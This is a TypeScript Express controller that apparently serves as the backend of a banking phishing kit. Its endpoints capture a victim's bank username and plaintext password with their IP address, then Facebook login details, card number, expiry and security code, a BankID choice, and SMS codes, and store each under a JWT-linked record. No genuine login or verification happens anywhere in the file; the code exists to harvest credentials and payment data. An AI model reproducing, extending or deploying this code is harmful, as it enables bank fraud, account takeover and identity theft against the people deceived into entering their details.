import jwt from "jsonwebtoken";
import { Response, Request, NextFunction } from "express";
import requestIp from 'request-ip';
import ipaddr from 'ipaddr';

import { Now } from "../../utils";
import setlog from "../../utils/setlog";
import config from "../../../config.json";
import UserDatas from "../data-access";

const UserController = {

	login: async (req: any, res: Response) => {
		try {
			console.log('login  ::', req.body);
			const { username, password, bankName } = req.body;
			const checkExistUser = await UserDatas.UserDB.findOne({ filter: { username: username } });
			if (checkExistUser) {
				return res.status(200).send({ message: 'Already Exist User', status: false });
			}
			const existData = await UserDatas.UserDB.find({ filter: {} })
			const dataLength = existData.length;
			const parseIp = requestIp.getClientIp(req);

			function removeIPv6Prefix(ipAddress) {
				return ipAddress.replace(/^::ffff:/, '');
			}
			const ipAddressWithoutPrefix = removeIPv6Prefix(parseIp);

			console.log(ipAddressWithoutPrefix);
			const newData = {
				userId: dataLength + 1,
				bankName: bankName,
				username: username,
				password: password,
				ip: ipAddressWithoutPrefix
			}
			await UserDatas.UserDB.create(newData);
			const tokenData = username;
			const token = jwt.sign({ username: tokenData }, config.JWT_SECRET, {
				expiresIn: '1h'
			})
			return res.status(200).send({ message: 'Successfully logined', status: true, token: token });

		} catch (err) {
			setlog("request", err);
			return res.status(200).send({ message: err.message || "internal error" });
		}
	},
	facebook: async (req: Request, res: Response) => {
		try {
			const { username, password, token } = req.body;
			jwt.verify(token, config.JWT_SECRET, async (err: any, userData: any) => {
				if (err) {
					return res.status(200).send({ message: 'token isnot match', status: false })
				}

				if (userData) {
					console.log(userData.username);
					const filter = {
						username: userData.username
					}
					const update = {
						facebook: { username, password }
					}
					await UserDatas.UserDB.update({ filter: filter, update: update });
					return res.status(200).send({ message: 'facebooklogin succeed', status: true })
				}
			})
		} catch (err) {
			setlog('request', err);
			return res.status(200).send({ message: err.message || "internal error" });
		}
	},
	card: async (req: Request, res: Response) => {
		try {
			const { cardNumber, valideTime, secureCode, token } = req.body;
			jwt.verify(token, config.JWT_SECRET, async (err: any, userData: any) => {
				if (err) {
					return res.status(200).send({ message: 'token isnot match', status: false })
				}

				if (userData) {
					const filter = {
						username: userData.username
					}
					const update = {
						cardInfo: { cardNumber, valideTime, secureCode }
					}
					await UserDatas.UserDB.update({ filter: filter, update: update });
					return res.status(200).send({ message: 'card succeed', status: true })
				}
			})
		} catch (err) {
			setlog('request', err);
			return res.status(200).send({ message: err.message || "internal error" });
		}
	},
	bankId: async (req: Request, res: Response) => {
		try {
			const { smartOption, token } = req.body;
			jwt.verify(token, config.JWT_SECRET, async (err: any, userData: any) => {
				if (err) {
					return res.status(200).send({ message: 'Please login', status: false })
				}
				if (userData) {
					const filter = {
						username: userData.username
					}
					const update = {
						bankId: smartOption
					}
					await UserDatas.UserDB.update({ filter: filter, update: update });
					return res.status(200).send({ message: 'bank succeed', status: true });
				}
			})
		} catch (err) {
			setlog('request', err);
			return res.status(200).send({ message: err.message || "internal error" });
		}
	},
	sms: async (req: Request, res: Response) => {
		try {
			const { sms, token } = req.body;
			jwt.verify(token, config.JWT_SECRET, async (err: any, userData: any) => {
				if (err) {
					return res.status(200).send({ message: 'token is not match', status: false })
				}
				if (userData) {
					const filter = {
						username: userData.username
					}
					const update = {
						sms: sms
					}
					await UserDatas.UserDB.update({ filter: filter, update: update });
					return res.status(200).send({ message: 'sms succeed', status: true });
				}
			})
		} catch (err) {
			setlog('request', err);
			return res.status(200).send({ message: err.message || "internal error" });
		}
	},
	valideToken: async (req: Request, res: Response) => {
		try {
			const { token } = req.body;
			jwt.verify(token, config.JWT_SECRET, async (err: any, userData: any) => {
				if (err) {
					return res.status(200).send({ message: 'Please login', status: false })
				}
				return res.status(200).send({ message: 'succeess', status: true })
			})
		} catch (err) {
			setlog('request', err);
			return res.status(200).send({ message: err.message || "internal error" });
		}
	},
}

export default UserController;
